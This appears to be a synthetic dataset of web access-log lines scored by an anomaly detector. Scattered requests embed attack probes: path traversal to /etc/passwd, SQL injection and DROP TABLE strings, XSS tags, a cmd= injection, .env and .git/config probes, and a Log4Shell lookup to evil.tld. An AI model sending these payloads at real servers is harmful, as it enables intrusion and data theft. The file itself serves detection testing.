score_content,score_session,score_fused,score_fused_norm,line
95.11105346679688,,95.11105346679688,95.11105346679688,213.163.122.141 - - [10/Jan/2025:12:05:50 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 15813 "-" "curl/7.85.0"
23.628538131713867,,23.628538131713867,23.628538131713867,153.74.48.47 - - [10/Jan/2025:12:05:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 5325 "https://twitter.com/" "nikto/2.5.0"
13.45602035522461,,13.45602035522461,13.45602035522461,2.145.8.216 - - [10/Jan/2025:12:05:53 +0100] "PUT /profile HTTP/1.1" 200 18945 "https://news.ycombinator.com/" "curl/7.85.0"
30184.017578125,,30184.017578125,30184.017578125,52.28.191.116 - - [10/Jan/2025:12:05:53 +0100] "OPTIONS /api/products HTTP/1.1" 401 1 "https://news.ycombinator.com/" "curl/7.85.0"
0.2797928750514984,,0.2797928750514984,0.2797928750514984,84.143.101.90 - - [10/Jan/2025:12:05:56 +0100] "GET /assets/app.js HTTP/1.1" 200 17504 "https://news.ycombinator.com/" "nikto/2.5.0"
69.43818664550781,,69.43818664550781,69.43818664550781,93.202.172.230 - - [10/Jan/2025:12:05:56 +0100] "HEAD /search?q=laptop HTTP/1.1" 201 13311 "https://news.ycombinator.com/" "nikto/2.5.0"
95.0790786743164,,95.0790786743164,95.0790786743164,220.91.44.121 - - [10/Jan/2025:12:05:58 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 201 8060 "https://example.com/" "sqlmap/1.7.2#stable"
48.90359878540039,,48.90359878540039,48.90359878540039,108.47.231.209 - - [10/Jan/2025:12:05:59 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 302 11398 "https://news.ycombinator.com/" "nikto/2.5.0"
73.52136993408203,,73.52136993408203,73.52136993408203,112.205.51.250 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /logout HTTP/1.1" 200 11696 "https://twitter.com/" "nikto/2.5.0"
71.6948471069336,,71.6948471069336,71.6948471069336,11.110.13.212 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14409 "https://www.google.com/" "nikto/2.5.0"
95.01774597167969,,95.01774597167969,95.01774597167969,194.136.91.148 - - [10/Jan/2025:12:06:03 +0100] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 5277 "https://twitter.com/" "nikto/2.5.0"
27.613508224487305,,27.613508224487305,27.613508224487305,55.49.152.227 - - [10/Jan/2025:12:06:03 +0100] "DELETE /api/products HTTP/1.1" 204 3267 "-" "dirb/2.22"
2.971931219100952,,2.971931219100952,2.971931219100952,165.211.121.34 - - [10/Jan/2025:12:06:04 +0100] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2749 "https://www.google.com/" "sqlmap/1.7.2#stable"
6.03757905960083,,6.03757905960083,6.03757905960083,254.229.55.234 - - [10/Jan/2025:12:06:05 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 304 810 "https://news.ycombinator.com/" "python-requests/2.31.0"
30160.056640625,,30160.056640625,30160.056640625,91.89.179.36 - - [10/Jan/2025:12:06:07 +0100] "DELETE /api/product?id=123 HTTP/1.1" 403 1015 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30.64531898498535,,30.64531898498535,30.64531898498535,250.98.107.170 - - [10/Jan/2025:12:06:10 +0100] "DELETE /dashboard HTTP/1.1" 302 17701 "https://example.com/" "python-requests/2.31.0"
50.80574035644531,,50.80574035644531,50.80574035644531,250.225.214.231 - - [10/Jan/2025:12:06:11 +0100] "HEAD /about HTTP/1.1" 304 7503 "https://twitter.com/" "dirb/2.22"
27.767229080200195,,27.767229080200195,27.767229080200195,197.63.229.253 - - [10/Jan/2025:12:06:13 +0100] "DELETE /admin HTTP/1.1" 200 1418 "-" "curl/7.85.0"
26.714466094970703,,26.714466094970703,26.714466094970703,127.88.32.178 - - [10/Jan/2025:12:06:16 +0100] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9561 "https://example.com/" "curl/7.85.0"
52.339107513427734,,52.339107513427734,52.339107513427734,69.174.98.70 - - [10/Jan/2025:12:06:17 +0100] "DELETE /search?q=laptop HTTP/1.1" 301 8633 "https://example.com/" "python-requests/2.31.0"
25.98088264465332,,25.98088264465332,25.98088264465332,66.35.84.96 - - [10/Jan/2025:12:06:18 +0100] "DELETE /cgi-bin/test.cgi HTTP/1.1" 200 3650 "https://news.ycombinator.com/" "dirb/2.22"
23.523160934448242,,23.523160934448242,23.523160934448242,196.245.226.101 - - [10/Jan/2025:12:06:19 +0100] "GET /search?q=monitor HTTP/1.1" 200 1925 "https://twitter.com/" "curl/7.85.0"
4.908982276916504,,4.908982276916504,4.908982276916504,138.132.26.43 - - [10/Jan/2025:12:06:20 +0100] "POST /about HTTP/1.1" 200 13330 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.025866746902466,,2.025866746902466,2.025866746902466,253.189.52.33 - - [10/Jan/2025:12:06:22 +0100] "GET /about HTTP/1.1" 200 18626 "https://example.com/" "sqlmap/1.7.2#stable"
95.20556640625,,95.20556640625,95.20556640625,251.21.198.168 - - [10/Jan/2025:12:06:24 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 5471 "-" "python-requests/2.31.0"
0.24528051912784576,,0.24528051912784576,0.24528051912784576,154.62.108.30 - - [10/Jan/2025:12:06:24 +0100] "GET /wp-login.php HTTP/1.1" 201 3676 "https://www.google.com/" "nikto/2.5.0"
0.3361908197402954,,0.3361908197402954,0.3361908197402954,14.223.69.199 - - [10/Jan/2025:12:06:24 +0100] "GET /index.html HTTP/1.1" 204 12301 "https://news.ycombinator.com/" "nikto/2.5.0"
30110.9140625,,30110.9140625,30110.9140625,192.17.31.84 - - [10/Jan/2025:12:06:27 +0100] "GET /assets/app.css HTTP/1.1" 404 267 "https://www.google.com/" "nikto/2.5.0"
104.77252960205078,,104.77252960205078,104.77252960205078,82.240.94.191 - - [10/Jan/2025:12:06:27 +0100] "TRACE /server-status HTTP/1.1" 200 19277 "https://www.google.com/" "nikto/2.5.0"
95.19481658935547,,95.19481658935547,95.19481658935547,190.246.140.253 - - [10/Jan/2025:12:06:30 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 16790 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30160.095703125,,30160.095703125,30160.095703125,251.28.133.157 - - [10/Jan/2025:12:06:33 +0100] "DELETE /search?q=camera HTTP/1.1" 404 852 "https://www.google.com/" "curl/7.85.0"
23.608905792236328,,23.608905792236328,23.608905792236328,30.118.145.143 - - [10/Jan/2025:12:06:33 +0100] "GET /search?q=phone HTTP/1.1" 200 11594 "-" "python-requests/2.31.0"
3.473256826400757,,3.473256826400757,3.473256826400757,110.90.19.32 - - [10/Jan/2025:12:06:33 +0100] "POST /.env HTTP/1.1" 200 18978 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.422218322753906,,49.422218322753906,49.422218322753906,138.41.28.179 - - [10/Jan/2025:12:06:36 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 10464 "https://twitter.com/" "python-requests/2.31.0"
1.833761215209961,,1.833761215209961,1.833761215209961,177.150.107.75 - - [10/Jan/2025:12:06:37 +0100] "GET /dashboard HTTP/1.1" 200 4955 "https://twitter.com/" "python-requests/2.31.0"
129.46868896484375,,129.46868896484375,129.46868896484375,72.153.98.59 - - [10/Jan/2025:12:06:38 +0100] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 17302 "https://twitter.com/" "dirb/2.22"
46.14262008666992,,46.14262008666992,46.14262008666992,252.219.169.34 - - [10/Jan/2025:12:06:41 +0100] "HEAD /.git/config HTTP/1.1" 200 8854 "https://twitter.com/" "dirb/2.22"
0.22455371916294098,,0.22455371916294098,0.22455371916294098,208.131.109.50 - - [10/Jan/2025:12:06:43 +0100] "GET /assets/app.js HTTP/1.1" 200 4165 "https://example.com/" "nikto/2.5.0"
49.373470306396484,,49.373470306396484,49.373470306396484,4.44.253.196 - - [10/Jan/2025:12:06:44 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 3073 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30137.974609375,,30137.974609375,30137.974609375,176.212.3.221 - - [10/Jan/2025:12:06:46 +0100] "DELETE /about HTTP/1.1" 403 1480 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
98.1136474609375,,98.1136474609375,98.1136474609375,210.153.72.135 - - [10/Jan/2025:12:06:47 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 8929 "-" "curl/7.85.0"
103.51616668701172,,103.51616668701172,103.51616668701172,44.5.234.220 - - [10/Jan/2025:12:06:49 +0100] "TRACE /.env HTTP/1.1" 200 4422 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
35.090675354003906,,35.090675354003906,35.090675354003906,247.176.117.195 - - [10/Jan/2025:12:06:52 +0100] "PUT /search?q=laptop HTTP/1.1" 200 9260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.75611114501953,,71.75611114501953,71.75611114501953,240.103.94.143 - - [10/Jan/2025:12:06:52 +0100] "OPTIONS /../../etc/passwd HTTP/1.1" 200 8976 "https://www.google.com/" "sqlmap/1.7.2#stable"
126.548095703125,,126.548095703125,126.548095703125,227.168.233.244 - - [10/Jan/2025:12:06:53 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 14438 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.8435869216918945,,4.8435869216918945,4.8435869216918945,120.62.45.66 - - [10/Jan/2025:12:06:56 +0100] "POST /contact HTTP/1.1" 204 16713 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.73478698730469,,50.73478698730469,50.73478698730469,86.62.105.93 - - [10/Jan/2025:12:06:57 +0100] "HEAD /profile HTTP/1.1" 302 18342 "-" "curl/7.85.0"
35.02101516723633,,35.02101516723633,35.02101516723633,124.227.239.222 - - [10/Jan/2025:12:06:57 +0100] "PUT /search?q=headphones HTTP/1.1" 200 9190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2756592035293579,,0.2756592035293579,0.2756592035293579,243.147.3.217 - - [10/Jan/2025:12:06:57 +0100] "GET /assets/app.js HTTP/1.1" 200 16220 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
23.559720993041992,,23.559720993041992,23.559720993041992,198.180.146.73 - - [10/Jan/2025:12:06:58 +0100] "GET /api/product?id=123 HTTP/1.1" 200 3149 "https://example.com/" "dirb/2.22"
0.0798177570104599,,0.0798177570104599,0.0798177570104599,244.177.203.90 - - [10/Jan/2025:12:07:01 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 5070 "-" "nikto/2.5.0"
23.524187088012695,,23.524187088012695,23.524187088012695,158.1.34.204 - - [10/Jan/2025:12:07:03 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 8045 "https://example.com/" "dirb/2.22"
35.08563995361328,,35.08563995361328,35.08563995361328,105.5.159.20 - - [10/Jan/2025:12:07:05 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 5676 "https://www.google.com/" "curl/7.85.0"
126.63119506835938,,126.63119506835938,126.63119506835938,126.241.225.53 - - [10/Jan/2025:12:07:07 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 2301 "https://example.com/" "dirb/2.22"
23.617053985595703,,23.617053985595703,23.617053985595703,3.222.60.230 - - [10/Jan/2025:12:07:10 +0100] "GET /search?q=phone HTTP/1.1" 200 13759 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11077.63671875,,11077.63671875,11077.63671875,195.14.104.47 - - [10/Jan/2025:12:07:12 +0100] "PUT /search?q=headphones HTTP/1.1" 500 423 "https://example.com/" "nikto/2.5.0"
3.213549852371216,,3.213549852371216,3.213549852371216,46.34.55.60 - - [10/Jan/2025:12:07:13 +0100] "GET /assets/app.js HTTP/1.1" 302 16598 "-" "Wget/1.21.2 (linux-gnu)"
0.28213298320770264,,0.28213298320770264,0.28213298320770264,19.142.42.112 - - [10/Jan/2025:12:07:15 +0100] "GET /assets/app.js HTTP/1.1" 200 18256 "https://news.ycombinator.com/" "dirb/2.22"
27.75139617919922,,27.75139617919922,27.75139617919922,141.179.206.15 - - [10/Jan/2025:12:07:18 +0100] "DELETE /profile HTTP/1.1" 200 14517 "https://example.com/" "python-requests/2.31.0"
47.5900993347168,,47.5900993347168,47.5900993347168,195.113.29.205 - - [10/Jan/2025:12:07:19 +0100] "HEAD /server-status HTTP/1.1" 200 12503 "https://news.ycombinator.com/" "dirb/2.22"
73.49191284179688,,73.49191284179688,73.49191284179688,73.116.82.22 - - [10/Jan/2025:12:07:20 +0100] "OPTIONS /logout HTTP/1.1" 200 5235 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.767913818359375,,27.767913818359375,27.767913818359375,60.179.45.179 - - [10/Jan/2025:12:07:21 +0100] "DELETE /login HTTP/1.1" 200 2130 "https://www.google.com/" "sqlmap/1.7.2#stable"
11042.7998046875,,11042.7998046875,11042.7998046875,44.135.147.78 - - [10/Jan/2025:12:07:22 +0100] "GET /index.html HTTP/1.1" 500 757 "https://news.ycombinator.com/" "curl/7.85.0"
126.6186294555664,,126.6186294555664,126.6186294555664,14.109.178.22 - - [10/Jan/2025:12:07:22 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 11900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.835906982421875,,27.835906982421875,27.835906982421875,209.226.222.52 - - [10/Jan/2025:12:07:22 +0100] "DELETE /about HTTP/1.1" 200 18481 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.474748611450195,,26.474748611450195,26.474748611450195,34.97.36.122 - - [10/Jan/2025:12:07:24 +0100] "POST /search?q=monitor HTTP/1.1" 200 12931 "https://twitter.com/" "dirb/2.22"
23.60820198059082,,23.60820198059082,23.60820198059082,232.173.163.171 - - [10/Jan/2025:12:07:27 +0100] "GET /search?q=laptop HTTP/1.1" 200 17524 "https://twitter.com/" "python-requests/2.31.0"
0.35618993639945984,,0.35618993639945984,0.35618993639945984,212.17.234.98 - - [10/Jan/2025:12:07:29 +0100] "GET /index.html HTTP/1.1" 200 16344 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.67573547363281,,69.67573547363281,69.67573547363281,184.214.91.224 - - [10/Jan/2025:12:07:31 +0100] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12452 "https://www.google.com/" "dirb/2.22"
4.790163516998291,,4.790163516998291,4.790163516998291,168.92.17.97 - - [10/Jan/2025:12:07:32 +0100] "POST /profile HTTP/1.1" 200 3090 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.25611817836761475,,0.25611817836761475,0.25611817836761475,184.43.143.172 - - [10/Jan/2025:12:07:32 +0100] "GET /assets/app.css HTTP/1.1" 200 17399 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.4339029788970947,,3.4339029788970947,3.4339029788970947,216.229.1.85 - - [10/Jan/2025:12:07:34 +0100] "POST /.env HTTP/1.1" 200 8299 "-" "nikto/2.5.0"
0.2510947585105896,,0.2510947585105896,0.2510947585105896,64.68.108.163 - - [10/Jan/2025:12:07:34 +0100] "GET /assets/app.css HTTP/1.1" 200 15851 "https://www.google.com/" "curl/7.85.0"
3.2252213954925537,,3.2252213954925537,3.2252213954925537,213.19.100.28 - - [10/Jan/2025:12:07:37 +0100] "POST /.git/config HTTP/1.1" 200 14572 "https://twitter.com/" "curl/7.85.0"
30.63117027282715,,30.63117027282715,30.63117027282715,254.27.190.150 - - [10/Jan/2025:12:07:37 +0100] "DELETE /dashboard HTTP/1.1" 301 19606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
49.33964538574219,,49.33964538574219,49.33964538574219,21.102.246.231 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 10336 "https://example.com/" "sqlmap/1.7.2#stable"
30161.181640625,,30161.181640625,30161.181640625,125.232.214.36 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 429 1305 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.719490051269531,,4.719490051269531,4.719490051269531,223.62.216.243 - - [10/Jan/2025:12:07:40 +0100] "POST /api/products HTTP/1.1" 200 5101 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.009330987930298,,2.009330987930298,2.009330987930298,17.18.172.80 - - [10/Jan/2025:12:07:40 +0100] "GET /login HTTP/1.1" 200 13644 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30134.376953125,,30134.376953125,30134.376953125,235.191.155.53 - - [10/Jan/2025:12:07:42 +0100] "GET /search?q=headphones HTTP/1.1" 404 304 "-" "curl/7.85.0"
13.431885719299316,,13.431885719299316,13.431885719299316,144.234.101.1 - - [10/Jan/2025:12:07:43 +0100] "PUT /contact HTTP/1.1" 200 11957 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.07657735049724579,,0.07657735049724579,0.07657735049724579,26.117.43.197 - - [10/Jan/2025:12:07:46 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 4450 "https://www.google.com/" "python-requests/2.31.0"
4.820132255554199,,4.820132255554199,4.820132255554199,60.10.206.94 - - [10/Jan/2025:12:07:48 +0100] "POST /logout HTTP/1.1" 200 1464 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.108158111572266,,35.108158111572266,35.108158111572266,146.130.145.208 - - [10/Jan/2025:12:07:50 +0100] "PUT /search?q=camera HTTP/1.1" 200 13673 "https://example.com/" "sqlmap/1.7.2#stable"
30160.09375,,30160.09375,30160.09375,217.120.231.136 - - [10/Jan/2025:12:07:52 +0100] "DELETE /search?q=camera HTTP/1.1" 404 1298 "https://news.ycombinator.com/" "dirb/2.22"
30158.080078125,,30158.080078125,30158.080078125,146.20.9.87 - - [10/Jan/2025:12:07:54 +0100] "HEAD /login HTTP/1.1" 403 100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.02980041503906,,38.02980041503906,38.02980041503906,198.119.145.110 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/product?id=123 HTTP/1.1" 302 4046 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
38.027339935302734,,38.027339935302734,38.027339935302734,97.39.139.241 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 3569 "https://example.com/" "dirb/2.22"
104.8804702758789,,104.8804702758789,104.8804702758789,184.246.225.176 - - [10/Jan/2025:12:07:59 +0100] "TRACE /profile HTTP/1.1" 200 3327 "https://example.com/" "dirb/2.22"
23.602231979370117,,23.602231979370117,23.602231979370117,163.155.240.86 - - [10/Jan/2025:12:08:00 +0100] "GET /search?q=laptop HTTP/1.1" 200 15687 "https://www.google.com/" "curl/7.85.0"
1.8172053098678589,,1.8172053098678589,1.8172053098678589,133.178.125.94 - - [10/Jan/2025:12:08:03 +0100] "GET /phpmyadmin HTTP/1.1" 204 8869 "https://www.google.com/" "sqlmap/1.7.2#stable"
95.3254165649414,,95.3254165649414,95.3254165649414,85.213.208.15 - - [10/Jan/2025:12:08:03 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17015 "-" "sqlmap/1.7.2#stable"
98.1119155883789,,98.1119155883789,98.1119155883789,16.242.221.193 - - [10/Jan/2025:12:08:04 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 13482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.409393310546875,,26.409393310546875,26.409393310546875,221.106.175.44 - - [10/Jan/2025:12:08:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 301 14812 "https://news.ycombinator.com/" "dirb/2.22"
27.75160026550293,,27.75160026550293,27.75160026550293,188.95.82.106 - - [10/Jan/2025:12:08:04 +0100] "DELETE /contact HTTP/1.1" 204 16236 "https://news.ycombinator.com/" "nikto/2.5.0"
0.24909041821956635,,0.24909041821956635,0.24909041821956635,230.130.197.218 - - [10/Jan/2025:12:08:05 +0100] "GET /assets/app.css HTTP/1.1" 200 15256 "https://news.ycombinator.com/" "nikto/2.5.0"
30.729963302612305,,30.729963302612305,30.729963302612305,182.228.158.70 - - [10/Jan/2025:12:08:08 +0100] "DELETE /contact HTTP/1.1" 304 11749 "https://www.google.com/" "curl/7.85.0"
1.9174599647521973,,1.9174599647521973,1.9174599647521973,149.224.246.61 - - [10/Jan/2025:12:08:08 +0100] "GET /contact HTTP/1.1" 200 293 "https://example.com/" "nikto/2.5.0"
46.40583419799805,,46.40583419799805,46.40583419799805,94.143.137.89 - - [10/Jan/2025:12:08:10 +0100] "HEAD /.env HTTP/1.1" 204 18961 "-" "dirb/2.22"
98.1309814453125,,98.1309814453125,98.1309814453125,77.75.44.144 - - [10/Jan/2025:12:08:10 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 304 8144 "-" "Wget/1.21.2 (linux-gnu)"
1.981748104095459,,1.981748104095459,1.981748104095459,240.218.25.128 - - [10/Jan/2025:12:08:12 +0100] "GET /logout HTTP/1.1" 200 16313 "https://news.ycombinator.com/" "curl/7.85.0"
3.151130437850952,,3.151130437850952,3.151130437850952,36.102.175.159 - - [10/Jan/2025:12:08:12 +0100] "GET /assets/app.css HTTP/1.1" 301 11274 "https://www.google.com/" "dirb/2.22"
13.471068382263184,,13.471068382263184,13.471068382263184,193.88.154.82 - - [10/Jan/2025:12:08:12 +0100] "PUT /about HTTP/1.1" 201 5306 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
52.360572814941406,,52.360572814941406,52.360572814941406,74.56.170.243 - - [10/Jan/2025:12:08:12 +0100] "DELETE /search?q=router HTTP/1.1" 302 8972 "https://news.ycombinator.com/" "dirb/2.22"
16.383142471313477,,16.383142471313477,16.383142471313477,205.238.34.33 - - [10/Jan/2025:12:08:14 +0100] "PUT /logout HTTP/1.1" 301 9605 "https://example.com/" "python-requests/2.31.0"
2.203610420227051,,2.203610420227051,2.203610420227051,152.48.25.184 - - [10/Jan/2025:12:08:17 +0100] "GET / HTTP/1.1" 204 11180 "https://twitter.com/" "dirb/2.22"
38.09230422973633,,38.09230422973633,38.09230422973633,131.175.60.114 - - [10/Jan/2025:12:08:18 +0100] "PUT /api/product?id=123 HTTP/1.1" 304 8504 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
129.58290100097656,,129.58290100097656,129.58290100097656,24.121.37.156 - - [10/Jan/2025:12:08:18 +0100] "TRACE /api/product?id=123 HTTP/1.1" 301 18891 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.12885665893554688,,0.12885665893554688,0.12885665893554688,121.116.95.241 - - [10/Jan/2025:12:08:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17051 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.3637036383152008,,0.3637036383152008,0.3637036383152008,10.87.150.237 - - [10/Jan/2025:12:08:22 +0100] "GET /index.html HTTP/1.1" 200 18730 "https://www.google.com/" "dirb/2.22"
30158.076171875,,30158.076171875,30158.076171875,88.76.35.102 - - [10/Jan/2025:12:08:24 +0100] "HEAD /admin HTTP/1.1" 400 24 "https://www.google.com/" "dirb/2.22"
47.67815017700195,,47.67815017700195,47.67815017700195,86.180.251.188 - - [10/Jan/2025:12:08:24 +0100] "HEAD /api/products HTTP/1.1" 200 11431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.518165588378906,,23.518165588378906,23.518165588378906,62.84.9.253 - - [10/Jan/2025:12:08:24 +0100] "GET /search?q=headphones HTTP/1.1" 200 11605 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.468497276306152,,13.468497276306152,13.468497276306152,213.145.55.33 - - [10/Jan/2025:12:08:27 +0100] "PUT /about HTTP/1.1" 200 546 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.31178462505340576,,0.31178462505340576,0.31178462505340576,75.77.52.175 - - [10/Jan/2025:12:08:27 +0100] "GET /index.html HTTP/1.1" 200 5530 "https://www.google.com/" "sqlmap/1.7.2#stable"
30112.439453125,,30112.439453125,30112.439453125,80.184.3.204 - - [10/Jan/2025:12:08:30 +0100] "GET / HTTP/1.1" 403 1227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.14514923095703,,95.14514923095703,95.14514923095703,229.29.14.142 - - [10/Jan/2025:12:08:30 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 7193 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.705412864685059,,4.705412864685059,4.705412864685059,119.120.172.57 - - [10/Jan/2025:12:08:33 +0100] "POST /api/products HTTP/1.1" 200 2296 "-" "sqlmap/1.7.2#stable"
3.172989845275879,,3.172989845275879,3.172989845275879,87.232.4.195 - - [10/Jan/2025:12:08:36 +0100] "POST /.git/config HTTP/1.1" 200 2860 "https://twitter.com/" "nikto/2.5.0"
3.1733009815216064,,3.1733009815216064,3.1733009815216064,227.43.167.139 - - [10/Jan/2025:12:08:39 +0100] "GET /assets/app.css HTTP/1.1" 302 11841 "https://example.com/" "curl/7.85.0"
95.12261199951172,,95.12261199951172,95.12261199951172,174.99.79.23 - - [10/Jan/2025:12:08:42 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 19502 "https://example.com/" "dirb/2.22"
16.399276733398438,,16.399276733398438,16.399276733398438,19.135.120.132 - - [10/Jan/2025:12:08:43 +0100] "PUT /logout HTTP/1.1" 301 13673 "https://www.google.com/" "curl/7.85.0"
